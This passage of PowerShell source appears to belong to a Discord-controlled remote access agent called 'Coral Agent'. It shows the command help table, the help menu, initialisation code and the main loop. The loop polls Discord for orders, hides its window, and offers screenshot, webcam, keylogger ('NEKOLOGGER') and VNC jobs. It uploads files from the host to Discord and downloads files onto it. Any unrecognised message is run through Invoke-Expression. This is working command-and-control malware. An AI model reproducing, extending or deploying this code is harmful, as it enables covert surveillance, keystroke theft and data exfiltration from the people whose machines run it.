        "CREATECHANNEL" = @{
            description = "Create a new Discord channel"
            params = @("name")
            usage = "CREATECHANNEL <channel-name>"
        }
        "LISTCHANNELS" = @{
            description = "List all registered channels and discover new ones"
            params = @("details", "refresh")
            usage = "LISTCHANNELS, LISTCHANNELS -details, LISTCHANNELS -refresh, or LISTCHANNELS -details -refresh"
        }
        "SETCHANNEL" = @{
            description = "Set the main channel for commands"
            params = @("name")
            usage = "SETCHANNEL <channel-name>"
        }
        "REMOVECHANNEL" = @{
            description = "Delete a channel from Discord and remove from registry"
            params = @("name")
            usage = "REMOVECHANNEL <channel-name>"
        }
        "UNREGISTERCHANNEL" = @{
            description = "Remove a channel from registry only (doesn't delete from Discord)"
            params = @("name")
            usage = "UNREGISTERCHANNEL <channel-name>"
        }
        "TESTCHANNEL" = @{
            description = "Send a test message to a specific channel"
            params = @("name")
            usage = "TESTCHANNEL <channel-name>"
        }
        "EXIT" = @{
            description = "Disconnect from the Coral Network"
            params = @()
            usage = "EXIT"
        }
    }
    
    $functionUpper = $FunctionName.ToUpper()
    
    # Check hardcoded commands first
    if ($hardcodedCommands.ContainsKey($functionUpper)) {
        $cmdInfo = $hardcodedCommands[$functionUpper]
        
        $msg = "**Description:** $($cmdInfo.description)`n"
        $msg += "**Type:** Hardcoded Command`n"
        
        if ($cmdInfo.params.Count -gt 0) {
            $msg += "**Parameters:** " + ($cmdInfo.params -join ", ") + "`n"
        } else {
            $msg += "**Parameters:** None`n"
        }
        
        $msg += "**Usage:** ``$($cmdInfo.usage)``"
        
        sendEmbedWithImage -Title "Function Help: $functionUpper" -Description $msg
        return
    }
    
    # Then check dynamic functions in registry
    $commandInfo = Find_CommandInRegistry -Command $FunctionName
    
    if (-not $commandInfo.Found) {
        sendEmbedWithImage -Title "ERROR" -Description ":x: **Function not found:** ``$FunctionName```n:information_source: **Use** ``HELP`` OR ``MODULES`` **to view all available functions**" -Color 13369344
        return
    }
    
    if ($commandInfo.IsRemote) {
        $script = $commandInfo.Script
        $msg = "**Description:** $($script.description)`n"
        $msg += "**Module:** $($commandInfo.ModuleName) (Remote)`n"
        
        if ($script.params.Count -gt 0) {
            $msg += "**Parameters:** " + ($script.params -join ", ") + "`n"
            $msg += "`n**Usage Examples:**`n"
            $msg += "• ``$($script.alias.ToUpper()) " + ($script.params -join " <value> ") + " <value>`` (positional)`n"
            $msg += "• ``$($script.alias.ToUpper()) " + ($script.params | ForEach-Object { "-$_ <value>" }) -join " " + "`` (named)"
        } else {
            $msg += "**Parameters:** None`n"
            $msg += "**Usage:** ``$($script.alias.ToUpper())``"
        }
        
        sendEmbedWithImage -Title "Function Help: $($script.alias.ToUpper())" -Description $msg
    } else {
        sendEmbedWithImage -Title "Local Function" -Description ":information_source: **Local function:** ``$($commandInfo.FunctionName)`` - No parameter info available"
    }
}
# =============================== HELP MENU ( R )===============================
function display_help {
    $message = "
                                         
Welcome to the Coral Agent Help Menu!

**Basic Commands:**
-> **TEST**: Test the connection to the Coral Network
-> **HELP**: Display this help menu
-> **HELP <function>**: Get detailed help for a specific function
-> **EXIT**: Disconnect from the Coral Network

**Module Management:**
-> **MODULES:** List all available modules and their status plus details about their commands

**Job Management:**
-> **JOBS:** List all active jobs with their status
-> **CREATEJOB <command>:** Create a new background job
-> **DELETEJOB <jobname>:** Stop and remove a specific job
-> **JOBOUTPUT <jobname>:** Get output and errors from a job
-> **JOBSTATUS <jobname>:** Get detailed status of a job
-> **STOPALLJOBS:** Stop all running jobs

**Job Examples:**
-> ``CREATEJOB SCREENSHOT``
-> ``CREATEJOB WEBCAM``
-> ``CREATEJOB ENABLENEKOLOGGER``

**Channel Management:**
-> **CREATECHANNEL <name>:** Create a new Discord channel
-> **LISTCHANNELS:** List registered channels and discover new ones
-> **LISTCHANNELS -details:** Show detailed channel information
-> **LISTCHANNELS -refresh:** Force complete refresh of channel registry
-> **LISTCHANNELS -details -refresh:** Force refresh with detailed info
-> **SETCHANNEL <name>:** Set the main channel for commands
-> **REMOVECHANNEL <name>:** Delete channel from Discord and remove from registry
-> **UNREGISTERCHANNEL <name>:** Remove from registry only (keeps Discord channel)
-> **TESTCHANNEL <name>:** Send a test message to specific channel

**Channel Examples:**
-> ``REMOVECHANNEL old-logs``      # Deletes from Discord + removes from registry
-> ``UNREGISTERCHANNEL temp-channel`` # Removes from registry only
-> ``LISTCHANNELS``              # Smart discovery + basic list
-> ``LISTCHANNELS -details``     # Smart discovery + detailed info
-> ``LISTCHANNELS -refresh``     # Complete rebuild + basic list
-> ``LISTCHANNELS -details -refresh``  # Complete rebuild + detailed info

**Theme System:**
-> **GETTHEME:** Show current theme status and details
-> **SETTHEME <name>:** Set theme (darktheme, neko_maid, neko_kimono, neko_cafe)
-> **ENABLETHEME:** Enable theme functionality
-> **DISABLETHEME:** Disable theme functionality

**File Operations:**
-> **SENDFILE <filepath>:** Upload a file to Discord
-> **DOWNLOADFILE [path]:** Download file attachments from Discord

**Parameter Usage Examples:**
**Positional:** ``SETTHEME neko_maid`` ``ENABLENEKOLOGGER 60`` ``CREATECHANNEL my-channel``
**Named:** ``SETTHEME -name neko_maid`` ``CREATEJOB -command SCREENSHOT`` ``TESTCHANNEL -name logs``

:information_source: **Use** ``MODULES`` **to see all available modules including PROCESS_MANAGEMENT, NEKOLOGGER, etc.**
:question: **Use** ``HELP <function>`` **for detailed function help**
:file_folder: **Use** ``LISTCHANNELS`` **to see all available channels**

**Note:** Dynamic functions (SCREENSHOT, WEBCAM, PROCESSLIST, etc.) are only loaded when called
**Tip:** Different modules can send messages to their own dedicated channels automatically!
"
    sendEmbedWithImage -Title "Coral Agent Help Menu" -Description $message
}
# =============================== INITIALIZATION ===============================
try {
    $mutexName = "Global\CoralNetworkAgent_$env:COMPUTERNAME"
    $global:CoralMutex = [System.Threading.Mutex]::new($false, $mutexName)
    if (-not $global:CoralMutex.WaitOne(100)) { [Environment]::Exit(1) }
} catch [System.Threading.AbandonedMutexException] {} catch {}

try { $global:botId = Get_BotUserId } catch { exit 1 }

try {
    if (!(CheckCategoryExists)) {
        NewChannelCategory
        $mainChannelId = NewChannel -name 'coral-control' -assignTo "main"
        $global:SessionID = $mainChannelId
    } else {
        # Register the existing coral-control channel
        $global:ChannelRegistry['coral-control'] = $global:ChannelID
        $global:SessionID = $global:ChannelID
    }
} catch { exit 1 }

if ($global:hidewindow) { try { HideWindow } catch {} }
try { sendEmbedWithImage -Title "Connected to Coral Network" -Description "You are now connected to the Coral Network." } catch { exit 1 } 
GetFfmpeg
# =============================== MAIN LOOP ===============================
while ($true) {
    $latestMessage = PullMsg
    $currentTime = Get-Date
    if (($currentTime - $global:lastJobCheck).TotalSeconds -ge 2) {
        Check_CompletedJobs
        $global:lastJobCheck = $currentTime
    }
    if ($latestMessage) {
        $previousMessage = $latestMessage
        
        # Parse command and parameters
        $parsed = Parse_CommandWithParameters -FullCommand $latestMessage
        $command = $parsed.Command.ToUpper()
        $parameters = $parsed.Parameters
        
        switch ($command) {
            'TEST' { sendEmbedWithImage -Title "TEST" -Description "Test successful from $env:COMPUTERNAME" }
            #Apply to individual commands
            'HELP' { 
                if ($parameters.Count -gt 0 -and $parameters.ContainsKey("param0")) {
                    Get_FunctionHelp -FunctionName $parameters["param0"]
                } else {
                    display_help 
                }
            }
            #Technically the same as COMMANDS hence COMMANDS is gone
            'MODULES' { List_Modules }
            #THEMES
            'GETTHEME' { GetCurrentTheme }
            'ENABLETHEME' { EnableTheme }
            'DISABLETHEME' { DisableTheme }
            'JOBS' { List_AgentJobs }
            'STOPALLJOBS' { Stop_AllAgentJobs }
            #CHANNELS
            'CREATECHANNEL' {
                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    NewChannel -name $channelName
                } else {
                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``CREATECHANNEL <channel-name>``" -Color 13369344
                }
            }

            'LISTCHANNELS' {
                $showDetails = $parameters.ContainsKey("details") -or $parameters.ContainsKey("d")
                $forceRefresh = $parameters.ContainsKey("refresh") -or $parameters.ContainsKey("r")
                List_Channels -ShowDetails:$showDetails -ForceRefresh:$forceRefresh
            }
            'SETCHANNEL' {
                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Set_MainChannel -channelName $channelName
                } else {
                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``SETCHANNEL <channel-name>``" -Color 13369344 
                }
            }

            'REMOVECHANNEL' {
                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Remove_ChannelFromRegistry -channelName $channelName
                } else {
                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``REMOVECHANNEL <channel-name>``" -Color 13369344
                }
            }

            'UNREGISTERCHANNEL' {
                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Remove_ChannelFromRegistry -channelName $channelName -DeleteFromDiscord:$false
                } else {
                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``UNREGISTERCHANNEL <channel-name>``" -Color 13369344
                }
            }
            'TESTCHANNEL' {
                if ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name")) {
                    $channelName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    sendEmbedWithImage -Title "Channel Test" -Description ":test_tube: **This message was sent to:** ``$channelName``" -ChannelTarget $channelName
                } else {
                    sendEmbedWithImage -Title "ERROR" -Description ":x: **Usage:** ``TESTCHANNEL <channel-name>``" -Color 13369344
                }
            }
            'EXIT' { 
                sendEmbedWithImage -Title "DISCONNECTING..." -Description "**$env:COMPUTERNAME disconnecting from Coral Network**"
                Stop_AllAgentJobs
                RemoveFfmpeg
                Execute_DynamicCommandWithParams -Command "DISABLENEKOUVNC"
                Execute_DynamicCommandWithParams -Command "PROCESSMONITORCLEANUP"
                Cleanup_CoralAgent
                exit 
            }
            
            default {
                if ($command -eq "SETTHEME" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $themeName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    SetCurrentTheme -themename $themeName
                }
                elseif ($command -eq "CREATEJOB" -and ($parameters.ContainsKey("param0") -or $parameters.Count -gt 0)) {
                    $scriptBlock = if ($parameters.ContainsKey("param0")) { $parameters["param0"] } else { 
                        ($parameters.Values -join " ") 
                    }
                    Start_AgentJob -ScriptString $scriptBlock
                }
                elseif ($command -eq "DELETEJOB" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Remove_AgentJob -JobName $jobName
                }
                elseif ($command -eq "JOBOUTPUT" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Get_AgentJobOutput -JobName $jobName
                }
                elseif ($command -eq "JOBSTATUS" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("name"))) {
                    $jobName = if ($parameters.ContainsKey("name")) { $parameters["name"] } else { $parameters["param0"] }
                    Get_AgentJobStatus -JobName $jobName
                }
                elseif ($command -eq "SENDFILE" -and ($parameters.ContainsKey("param0") -or $parameters.ContainsKey("path"))) {
                    $filePath = if ($parameters.ContainsKey("path")) { $parameters["path"] } else { $parameters["param0"] }
                    if (Test-Path $filePath) {
                        sendFile -sendfilePath $filePath
                    } else {
                        sendEmbedWithImage -Title "File Not Found" -Description ":x: **File not found:** ``$filePath``"
                    }
                }
                elseif ($command -eq "DOWNLOADFILE") {
                    $downloadPath = if ($parameters.ContainsKey("path")) { $parameters["path"] } 
                                   elseif ($parameters.ContainsKey("param0")) { $parameters["param0"] } 
                                   else { $env:TEMP }
                    
                    if ($global:lastMessageAttachments -and $global:lastMessageAttachments.Count -gt 0) {
                        sendEmbedWithImage -Title "Download Started" -Description ":inbox_tray: **Starting download of $($global:lastMessageAttachments.Count) file(s)...**"

                        foreach ($attachment in $global:lastMessageAttachments) {
                            $fileName = $attachment.filename
                            $fileUrl = $attachment.url
                            $fileSize = [math]::Round($attachment.size / 1KB, 2)

                            sendEmbedWithImage -Title "Downloading" -Description ":arrow_down: **Downloading:** ``$fileName`` (${fileSize} KB)"
                            downloadFile -attachmentUrl $fileUrl -fileName $fileName -downloadPath $downloadPath
                        }
                    } else {
                        sendEmbedWithImage -Title "ERROR" -Description ":x: **No file attachments found in the message**" -Color 13369344
                        sendEmbedWithImage -Title "Usage" -Description ":information_source: **Usage:** Send a message with file attachments and the command ``DOWNLOADFILE [path]``"
                    }
                }
                else {
                    # Try to execute as a dynamic command from the registry with parameters
                    $commandExecuted = Execute_DynamicCommandWithParams -Command $command -Parameters $parameters
                    
                    if (-not $commandExecuted) {
                        # Fall back to PowerShell expression evaluation
                        try {
                            $result = Invoke-Expression $latestMessage 2>&1
                            if ($result) {
                                $output = $result | Out-String
                                sendEmbedWithImage -Title "Command Output" -Description ":white_check_mark: **Command executed successfully:** ``$latestMessage```n**Output:** ```n$output```""
                            } else {
                                sendEmbedWithImage -Title "Command Executed" -Description ":white_check_mark: **Command executed successfully:** ``$latestMessage``"
                            }
                        } catch {
                            $errorMsg = $_.Exception.Message
                            if ($errorMsg.Length -gt 1000) {
                                $errorMsg = $errorMsg.Substring(0, 1000) + "... (error truncated)"
                            }
                            sendEmbedWithImage -Title "ERROR" -Description ":x: **Error executing command:** ``$latestMessage```n**Error:** $errorMsg" -Color 13369344
                        }
                    }
                }
            }
        }
        Check_CompletedJobs
    }
    Start-Sleep -Seconds 3
}